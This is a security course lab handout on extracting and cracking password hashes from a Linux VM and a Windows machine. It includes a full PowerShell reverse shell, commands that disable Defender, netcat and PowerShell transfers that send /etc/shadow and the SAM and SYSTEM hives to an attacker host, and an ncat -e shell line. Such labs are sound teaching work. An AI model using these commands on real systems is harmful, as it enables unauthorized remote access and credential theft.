# Lab 7: Password Cracking with John the Ripper and Hashcat
### Credential Extraction — Linux Shadow Files & Windows SAM Registry Hives

---

## The Thursday That Saved The Audit

The engagement had been going for nine days when **Kai Eriksen** finally got the call he was waiting for.

The client — a mid-size logistics company in Copenhagen — had hired his red team for a full adversarial simulation. The rules were simple: get in, move laterally, reach the domain controller, and do not get caught for two weeks. If the blue team detected them before day fourteen, the blue team won.

It was day nine. Kai had a foothold on a Linux jump server and a Windows workstation in the finance subnet. The blue team had not noticed yet. But the clock was running.

He needed to do two things before the weekend: establish **persistent access** on both machines, and **extract credentials** he could use to move deeper into the network. Not because he needed them tonight — but because if his initial foothold was burned on Monday, he would still have a way back in.

He opened two terminals.

```
Terminal 1: nc -lvnp 4444        # listener for the Linux box
Terminal 2: nc -lvnp 4445        # listener for the Windows box
```

Thirty minutes later he had shell sessions on both targets, two shadow files and two registry hives sitting on his desk, and John the Ripper working quietly in the background.

By midnight he had five plaintext passwords.

One of them — `password123` — had belonged to a sysadmin with sudo access on seven servers.

That is how lateral movement works. Not zero-days. Not custom implants. A weak password, an nc session, and patience.

---

## Lab Overview

| Item | Detail |
|---|---|
| **Duration** | 90–120 minutes |
| **Level** | Intermediate |
| **Attacker Machine** | ParrotOS or Kali Linux |
| **Target 1** | Alpine Linux VM (auto-provisioned via Vagrant) |
| **Target 2** | Your own Windows machine (users created manually) |
| **Goal** | Extract password hashes from both targets via a reverse shell session, then crack them with John the Ripper and hashcat |

---

## Lab Environment

```
[ParrotOS / Kali — Attacker]    192.168.56.1   (VirtualBox host-only adapter)
[Alpine Linux VM — Target 1]    192.168.56.101  (vagrant up)
[Windows PC — Target 2]         Your own machine (any IP reachable from ParrotOS)
```

> Your ParrotOS IP on the host-only interface may differ. Always confirm with:
> ```bash
> ip addr show | grep 192.168.56
> ```

---

## Prerequisites

Install the following on your **ParrotOS / Kali** machine before starting:

```bash
sudo apt update
sudo apt install -y john hashcat netcat-openbsd python3-impacket

# Verify tools
john --version
hashcat --version
impacket-secretsdump --help 2>&1 | head -5

# Confirm rockyou.txt is available (pre-installed on ParrotOS/Kali)
ls /usr/share/wordlists/rockyou.txt
# If compressed:
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

---

---

# Task 1 — Alpine Linux: Extract and Crack Shadow Hashes

## Step 1 — Boot the Target VM

```bash
cd vm_labs/lab7/
vagrant up
```

Wait for provisioning to complete. Confirm the VM is reachable:

```bash
ping -c3 192.168.56.101
```

---

## Step 2 — Set Up Your Reverse Shell Listener

On your **ParrotOS machine**, open a terminal and start the listener:

```bash
nc -lvnp 4444
```

Leave this terminal open and waiting.

---

## Step 3 — Trigger the Reverse Shell from Alpine

Open a **second terminal** on ParrotOS and SSH into the Alpine VM:

```bash
vagrant ssh
```

From inside the Alpine VM, trigger the reverse shell back to your listener.
Replace `192.168.56.1` with your actual ParrotOS IP if different:

```bash
sudo /opt/trigger_shell.sh 192.168.56.1 4444
```

---

## Step 4 — Verify Shell Access

Switch back to Terminal 1 (your nc listener). You should see a connection arrive:

```
Connection from 192.168.56.101:XXXXX
```

Test that you have a root shell:

```sh
id
# Expected: uid=0(root) gid=0(root)

hostname
# Expected: alpine-target

cat /etc/os-release | head -3
```

> **What just happened?** The Alpine VM connected *outbound* to your listener. This is a
> **reverse shell** — the target initiates the connection, bypassing firewall rules that
> block inbound connections. This is one of the core techniques in maintaining persistent
> access after an initial compromise.

---

## Step 5 — Exfiltrate /etc/passwd and /etc/shadow

You need both files. The `unshadow` tool (used later) requires them to work together.

**Open two more terminals on ParrotOS** to receive the files:

```bash
# Terminal 3 — receive passwd
nc -lvnp 5555 > passwd.txt

# Terminal 4 — receive shadow
nc -lvnp 5556 > shadow.txt
```

**In your active reverse shell (Terminal 1)**, send both files:

```sh
# Send /etc/passwd
cat /etc/passwd | ncat 192.168.56.1 5555

# Send /etc/shadow
cat /etc/shadow | ncat 192.168.56.1 5556
```

**Verify the files arrived on ParrotOS** (Terminals 3 and 4 will exit after transfer):

```bash
# On ParrotOS
wc -l passwd.txt shadow.txt
grep "user0" shadow.txt     # Confirm all 5 lab users are present
```

The shadow entries for your lab users will look like:

```
user01:$6$rounds=5000$SomeSalt$<hash>:...:
user02:$6$rounds=5000$AnotherSalt$<hash>:...:
```

> `$6$` = **sha512crypt** — 5000 rounds of SHA-512 with a random salt.
> This is the default on Alpine (and most modern Linux distros).
> The salt means identical passwords produce *different* hashes — rainbow tables are useless.

---

## Step 6 — Crack with John the Ripper

### 6.1 — Prepare the hash file

```bash
# Combine passwd + shadow into a single crackable file
unshadow passwd.txt shadow.txt > combined_linux.txt

# Inspect what john sees
john --list=formats | grep -i sha512
```

### 6.2 — Wordlist attack (rockyou)

```bash
# Time this command — note how long it takes
time john combined_linux.txt \
  --format=sha512crypt \
  --wordlist=/usr/share/wordlists/rockyou.txt

# Show cracked passwords
john combined_linux.txt --show
```

### 6.3 — Rule-based attack (for harder passwords)

Wordlists alone will not crack leet-speak or hybrid passwords. Rules apply
transformations to each wordlist entry (capitalize, substitute letters, append numbers):

```bash
time john combined_linux.txt \
  --format=sha512crypt \
  --wordlist=/usr/share/wordlists/rockyou.txt \
  --rules=best64

# Show all results so far
john combined_linux.txt --show
```

### 6.4 — Check John's session progress

```bash
# If still running in another terminal:
john --status

# Restore a previously interrupted session:
john --restore
```

---

## Step 7 — Crack with Hashcat

Hashcat works on raw hash values, not the full shadow file format. Extract just the
hash strings first:

```bash
# Extract sha512crypt hash lines for lab users only
grep -E "^user0" shadow.txt | cut -d: -f2 > linux_hashes_hashcat.txt
cat linux_hashes_hashcat.txt
```

### 7.1 — Wordlist attack

```bash
# -m 1800 = sha512crypt ($6$)
# --force  = required inside a VM (no GPU, forces CPU mode)
time hashcat -m 1800 linux_hashes_hashcat.txt \
  /usr/share/wordlists/rockyou.txt \
  --force

# Show cracked passwords
hashcat -m 1800 linux_hashes_hashcat.txt --show
```

### 7.2 — Rule-based attack

```bash
time hashcat -m 1800 linux_hashes_hashcat.txt \
  /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  --force

hashcat -m 1800 linux_hashes_hashcat.txt --show
```

### 7.3 — Benchmark (measure theoretical speed)

```bash
# How fast can hashcat crack sha512crypt on this machine?
hashcat -b -m 1800 --force
```

Record the **H/s (hashes per second)** value — you will use it in the analysis section.

---

## Task 1 — Timing Table (fill in)

| User | Password | Cracked by John? | John Time | Cracked by Hashcat? | Hashcat Time | Method that worked |
|---|---|---|---|---|---|---|
| user01 | | | | | | |
| user02 | | | | | | |
| user03 | | | | | | |
| user04 | | | | | | |
| user05 | | | | | | |

> For any password that **does not crack**, write `NOT CRACKED` and estimate the theoretical
> brute-force time in the analysis section using the benchmark speed you recorded.

---

---

# Task 2 — Windows: Extract and Crack NTLM Hashes

## Step 1 — Create 5 User Accounts on Windows

Open **Command Prompt as Administrator** on your Windows machine:

```cmd
net user user01 password123   /add
net user user02 "Summer2024!" /add
net user user03 Tr0ub4dor3    /add
net user user04 "C0rr3ct!Horse" /add
net user user05 "xK9#mP2$vL7!" /add
```

Verify the accounts were created:

```cmd
net user | findstr user0
```

---

## Step 2 — Disable Windows Defender (Lab Only)

The PowerShell reverse shell will trigger Defender's real-time protection.
Disable it temporarily for this lab:

```powershell
# Run in Administrator PowerShell
Set-MpPreference -DisableRealtimeMonitoring $true
```

> **Re-enable after the lab:**
> ```powershell
> Set-MpPreference -DisableRealtimeMonitoring $false
> ```

---

## Step 3 — Find Your IP Addresses

On **Windows** (you need this to configure the reverse shell):

```powershell
ipconfig | findstr IPv4
```

On **ParrotOS** (you need this as the listener address):

```bash
ip addr show | grep inet | grep -v 127
```

Note both IPs — substitute them in the commands below.

---

## Step 4 — Start the Listener on ParrotOS

```bash
nc -lvnp 4445
```

---

## Step 5 — Run the PowerShell Reverse Shell on Windows

Open **PowerShell as Administrator** on your Windows machine.

First, bypass the execution policy for this session:

```powershell
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
```

Then run the reverse shell. Replace `PARROTOS_IP` with your ParrotOS IP:

```powershell
$ip = "PARROTOS_IP"
$port = 4445
$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535 | % { 0 }
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (Invoke-Expression $data 2>&1 | Out-String)
    $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "
    $sendbyte = ([Text.Encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

Switch back to your ParrotOS listener terminal — you should have a PowerShell prompt.

---

## Step 6 — Dump the SAM and SYSTEM Registry Hives

Through your PowerShell shell session on **ParrotOS**, run:

```powershell
# Create staging directory
New-Item -ItemType Directory -Path C:\Temp -Force

# Dump the SAM hive (contains password hashes)
reg save HKLM\SAM C:\Temp\sam.save /y

# Dump the SYSTEM hive (contains the boot key to decrypt SAM)
reg save HKLM\SYSTEM C:\Temp\system.save /y

# Confirm both files exist
Get-Item C:\Temp\sam.save, C:\Temp\system.save | Select-Object Name, Length
```

> **Why do you need both files?**
> The SAM hive stores NTLM hashes encrypted with a **boot key** (also called SysKey).
> The boot key lives in the SYSTEM hive. Without SYSTEM, SAM is an encrypted blob you
> cannot read. With both, `impacket-secretsdump` reconstructs the plaintext hashes.

---

## Step 7 — Transfer the Hive Files to ParrotOS

Open **two new terminals on ParrotOS** to receive the files:

```bash
# Terminal 3 — receive SAM
nc -lvnp 5557 > sam.save

# Terminal 4 — receive SYSTEM
nc -lvnp 5558 > system.save
```

**In your PowerShell shell session**, send both files using a pure PowerShell TCP client:

```powershell
# Transfer SAM
$c = New-Object System.Net.Sockets.TcpClient("PARROTOS_IP", 5557)
$s = $c.GetStream()
$b = [System.IO.File]::ReadAllBytes("C:\Temp\sam.save")
$s.Write($b, 0, $b.Length); $s.Flush(); $c.Close()

# Transfer SYSTEM
$c = New-Object System.Net.Sockets.TcpClient("PARROTOS_IP", 5558)
$s = $c.GetStream()
$b = [System.IO.File]::ReadAllBytes("C:\Temp\system.save")
$s.Write($b, 0, $b.Length); $s.Flush(); $c.Close()
```

Verify the files arrived on ParrotOS:

```bash
ls -lh sam.save system.save
file sam.save      # Should show: MS Windows registry file
```

---

## Step 8 — Extract NTLM Hashes with impacket-secretsdump

```bash
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

Sample output:

```
[*] Target system bootKey: 0x1234abcd...
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
user01:1001:aad3b435b51404eeaad3b435b51404ee:482c811da5d5b4bc6d497ffa98491e38:::
user02:1002:aad3b435b51404eeaad3b435b51404ee:...:::
```

The hash format is `username:RID:LM_hash:NT_hash:::`.
The **NT hash** (4th field) is what you crack. The LM hash (`aad3b435...`) is a blank
placeholder — Windows has disabled LM hashing since Vista.

### Prepare hash files for cracking tools

```bash
# Full format for John (username:NT_hash)
impacket-secretsdump -sam sam.save -system system.save LOCAL 2>/dev/null \
  | grep -E "^user0" \
  | awk -F: '{print $1":"$4}' > ntlm_john.txt

cat ntlm_john.txt

# NT hashes only for hashcat (one hash per line)
cut -d: -f2 ntlm_john.txt > ntlm_hashcat.txt

cat ntlm_hashcat.txt
```

---

## Step 9 — Crack with John the Ripper

### 9.1 — Wordlist attack

```bash
time john ntlm_john.txt \
  --format=NT \
  --wordlist=/usr/share/wordlists/rockyou.txt

john ntlm_john.txt --show
```

### 9.2 — Rule-based attack

```bash
time john ntlm_john.txt \
  --format=NT \
  --wordlist=/usr/share/wordlists/rockyou.txt \
  --rules=best64

john ntlm_john.txt --show
```

---

## Step 10 — Crack with Hashcat

### 10.1 — Wordlist attack

```bash
# -m 1000 = NTLM
time hashcat -m 1000 ntlm_hashcat.txt \
  /usr/share/wordlists/rockyou.txt \
  --force

hashcat -m 1000 ntlm_hashcat.txt --show
```

### 10.2 — Rule-based attack

```bash
time hashcat -m 1000 ntlm_hashcat.txt \
  /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  --force

hashcat -m 1000 ntlm_hashcat.txt --show
```

### 10.3 — Benchmark

```bash
hashcat -b -m 1000 --force
```

Record the **H/s** — NTLM will be dramatically faster than sha512crypt.

---

## Task 2 — Timing Table (fill in)

| User | Password | Cracked by John? | John Time | Cracked by Hashcat? | Hashcat Time | Method that worked |
|---|---|---|---|---|---|---|
| user01 | | | | | | |
| user02 | | | | | | |
| user03 | | | | | | |
| user04 | | | | | | |
| user05 | | | | | | |

---

---

# Analysis

## Linux SHA-512 vs Windows NTLM — Speed Comparison

Fill in this table using the benchmark values you recorded:

| Algorithm | Tool | Hashes/sec (your machine) | Time to crack `password123` | Time to brute-force `xK9#mP2$vL7!`* |
|---|---|---|---|---|
| sha512crypt (`$6$`) | hashcat | | | |
| NTLM | hashcat | | | |

*\* 12-char password, charset: a-z A-Z 0-9 symbols (~94 chars). Keyspace = 94^12 ≈ 4.76 × 10²³*
*\* Estimated time = keyspace ÷ hashes\_per\_second*

### Why Is NTLM So Much Faster to Crack?

| Property | sha512crypt (Linux `$6$`) | NTLM (Windows) |
|---|---|---|
| Algorithm | SHA-512, 5000 iterations | Single MD4 operation |
| Salt | Yes — unique per account | No |
| Iterations | 5000 (configurable) | 1 |
| Typical GPU speed | ~200K H/s | ~20 billion H/s |
| Rainbow table resistant | Yes (salted) | No |
| Relative cracking speed | Baseline | ~100,000× faster |

> This speed difference is the reason why **Pass-the-Hash** attacks exist against Windows —
> NTLM hashes are so cheap to compute that cracking short/common passwords is nearly instant,
> and the hash itself can sometimes be used directly for authentication without ever knowing
> the plaintext.

---

# Discussion Questions

**1. Both tasks used the same 5 passwords. Did both operating systems produce different hash values for the same password? Why?**

**2. `user05`'s password (`xK9#mP2$vL7!`) likely did not crack. Using the hashcat benchmark speed you recorded, calculate how long a brute-force attack would take against this password for both sha512crypt and NTLM. Show your math.**

**3. The reverse shell in Task 1 connected *outbound* from Alpine to ParrotOS. Why is this more reliable than setting up a listener on Alpine and connecting inbound? What network control does this technique bypass?**

**4. In Task 2 you used `reg save` to dump the SAM hive while Windows was running. Windows normally locks the SAM file — how does `reg save` succeed where a direct file copy would fail?**

**5. If the sysadmin on the Alpine VM had used `user01:password123` on seven servers (as in the story), and all those servers stored sha512crypt hashes — would cracking the hash once be enough to log in to all seven? Explain why or why not, referencing the role of the salt.**

**6. Recommend a password policy for this company. Specify: minimum length, required character classes, whether complexity alone is sufficient, and what additional controls (beyond password length) would most reduce the risk demonstrated in this lab.**

---

# Deliverables

Submit a **single PDF** containing:

1. **Both Timing Tables** — Tasks 1 and 2, fully filled in
2. **Analysis Table** — sha512crypt vs NTLM speed comparison with your benchmark numbers
3. **Terminal screenshots** confirming:
   - Reverse shell session active on ParrotOS (Task 1 and Task 2)
   - Shadow file and hive files successfully exfiltrated
   - John and hashcat cracked output (`--show` output for both tasks)
4. **Answers to all 6 Discussion Questions**
5. **Reflection paragraph** (5–8 sentences): What surprised you most about the speed difference between algorithms? If you were a sysadmin hardening these two systems tomorrow, what is the single highest-impact change you would make on each?

---

# Tools Reference

| Tool | Purpose | Key flags used |
|---|---|---|
| `nc -lvnp PORT` | Reverse shell listener | `-l` listen, `-v` verbose, `-n` no DNS, `-p` port |
| `ncat IP PORT -e /bin/sh` | Initiate reverse shell (Alpine) | `-e` execute |
| PowerShell `TcpClient` | Reverse shell + file transfer (Windows) | Pure PS, no binary |
| `unshadow` | Merge passwd + shadow for John | `unshadow passwd shadow > combined` |
| `john` | CPU-based password cracker | `--format`, `--wordlist`, `--rules`, `--show` |
| `hashcat` | GPU/CPU password cracker | `-m 1800` sha512, `-m 1000` NTLM, `-b` benchmark |
| `impacket-secretsdump` | Extract NTLM hashes from hive files | `-sam`, `-system`, `LOCAL` |
| `reg save` | Dump registry hives (Windows) | `HKLM\SAM`, `HKLM\SYSTEM` |

---

> **Ethics Notice:** This lab targets systems you own or have explicit authorization to
> test (your own VM and your own Windows machine). Extracting password hashes, running
> reverse shells, or cracking credentials on any system without written authorization
> is a criminal offense in most jurisdictions. The goal here is to understand attacker
> techniques so you can build better defenses. Think purple team — always.
